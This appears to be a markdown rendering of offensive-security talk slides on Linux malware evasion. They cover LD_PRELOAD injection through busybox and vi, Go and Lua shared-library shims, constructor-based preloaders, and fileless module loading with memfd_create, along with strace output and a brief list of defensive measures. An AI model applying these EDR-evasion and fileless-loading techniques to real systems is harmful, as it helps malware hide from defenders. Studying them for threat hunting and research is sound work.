# Advanced Evasion Techniques and Memory-Resident Malware

## Introduction
This document outlines advanced evasion techniques and the use of memory-resident malware. It covers various methods to bypass security measures, including preloading, dynamic code execution, and in-memory module loading.

## Preloading for Evasion
### Example: Shadowrun Directory Setup
```bash
mkdir /tmp/shadowrun
ln -s /bin/ls /tmp/shardowrun/ls
```

### Using `LD_PRELOAD` for Code Injection
```bash
LD_PRELOAD=payload.so /lib64/ld-linux-x86-64.so.2 /bin/busybox
run-parts /tmp/shadowrun/
```

### Executing Commands with `LD_PRELOAD`
```bash
echo | LD_PRELOAD=payload.so /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls
```

### Editing Files with `vi` and `mktemp`
```bash
LD_PRELOAD=payload.so /lib64/ld-linux-x86-64.so.2 vi -ensX $(/bin/busybox mktemp) -c ':1,$d' -c ':silent !/bin/ls' -c ':wq'
```

## Out of the Box Decoys (Continued)
### Second Order Evasion Capabilities
- **Interface with higher-level code** for greater evasion.
- **Rapid prototyping and development** of modular malware.
  - Speed of development
  - Better upgrades
  - Memory safety
- **Offense to retool quickly** on the target box.
- **Evade into reflection**: Dynamic code makes EDRs lose track in reflection tracing a call chain to a verified IoC.
- **Extend malware** into preloading code from dynamic languages with decent FFI.

### Hiding Behind Reflective Mirrors
#### Go Code Example
```go
package main

import "C"
import "fmt"

var count int

//export Entry
func Entry(msg string) int {
    fmt.Println(msg)
    return count
}

func main() { // don't care, or wild goose chase }
```
Build the shared library:
```bash
go build -o shim.so -buildmode=c-shared shim.go
```

### Escape to Dynamic Code: Interpreters
#### C Code Example
```c
#include <lua.h>
#include <lauxlib.h>
#include <lualib.h>

int main(int argc, char** argv) {
    lua_State *L = luaL_newstate();
    luaL_openlibs(L);

    if (luaL_loadfile(L, argv[1])) {
        lua_pcall(L, 0, 0, 0);
    }

    lua_close(L);
}
```
Run the Lua script:
```bash
LD_LIBRARY_PATH=. LD_PRELOAD=./liblua.so ./invoke_lua hello.lua
```

### EDR Evasion via Scripting
- EDRs lose trail if you escape out to scripting.
- Start loading other libraries at runtime.
- Pro-tip: Use it as another abstraction layer, e.g., socket out or pipe to another process hosting additional payloads.

## Summary: Ainâ€™t No Primitive Primitives
### Stage II: Weaponizing and Operationalizing Payloads
- **Uber preloaders**
- **Inline Parameterized Command Evasion**
- **Memory-resident Malware Modules**
- **Modular Malware Payload Warehouses**
- **Remote module loads**
- **Utilizable loaders**

### Uber Preloaders
#### C Code Example
```c
__attribute__((constructor)) static void _mctor(int argc, char **argv, char** envp) {
    largv = argv;
    largc = argc;
    lenvp = envp;
    lenvp_start = envp;  /* code here */
}
```
Run the preloader:
```bash
LD_PRELOAD=./lib/libctx.so.1 /bin/ls
```

### Resolving Entry Symbol
```c
int (*entry)(char *) = dlsym(handle, "Entry");
if ((modload_args_t = (char*) getenv("LD_MODULE_ARGS")) != NULL) {
    modload_args = strdup(modload_args_t);
    modload_args_len = strlen(modload_args);
}
```

### Chains and IPC Communication
- `dlopen()` a module or use weak references
- Adhere to API contracts
- Implement process mimicry and decoys
- Switch on IPC communication and data signaling
- Clean out artifacts (a la rootkit)

### Memory-Resident Malware Modules
- **Problem**: Modules are files on disk, scannable by EDRs and admins.
- **Solution**: Load modules in memory using `memfd_create(2)`.

### Linux Shared Memory Methods
- **tmpfs filesystem** (via `/dev/shm`), requires root to mount.
- **POSIX shared memory**, memory-mapped files.
- **Kernel 3.17+**: `memfd_create(2)` system call.

### Example: Creating a Memory File Descriptor
```bash
shm_fd = memfd_create(s, MFD_ALLOW_SEALING);
```

### Strace Output
```bash
56880 18:26:52.395703 memfd_create("R6YP4OOR", MFD_CLOEXEC) = 3
56884 18:26:52.586221 readlink("/proc/self/exe", "/memfd:R6YP4OOR (deleted)", 4096) = 25
56886 18:26:52.632680 memfd_create("fa37Jn", MFD_CLOEXEC) = 4
```

### PyPreload: Cradle + (Decoy/Mimicry) + Memory + ZAF
- ASLR at-start weakening: Weaken targets via predictable memory addresses.
- Cross Memory Attach: Artificial code caves, IPC evasion.

### Offensive Summary
- **Preloading** is a viable path to evasion via system executables.
- **Clean cradles** to build on, or use executables on the target as decoys.
- **Assembled attack**: Split/Scatter/Assemble techniques vs. EDRs.
- **Out-of-process payload delivery** is sometimes necessary.
- **C FFI** is the common denominator for interop on Linux and can be used for evasion.
- **Protect your payloads** and payload delivery mechanisms.

### Defensive Measures
- Implement Linux capabilities.
- Define clearly what EDRs will and can do for you.
- Use provided ideas for manual threat hunting.
- Optics into `/proc`, dynamic loading, `memfd()`, IPC, and process library load.
- Think about proactive contextual supervision.

### Useful Links
- [Fileless memfd_create](https://x-c3ll.github.io/posts/fileless-memfd_create/)
- [Super Stealthy Droppers](https://0x00sec.org/t/super-stealthy-droppers/3715)
- [glibc gmon-start.c](https://github.com/lattera/glibc/blob/master/csu/gmon-start.c)
- [py-setproctitle](https://github.com/dvarrazzo/py-setproctitle/tree/master/src)
- [LD_NOT_PRELOADED_FOR_REAL](https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/)
- [Gist: apsun](https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1)

Thank you!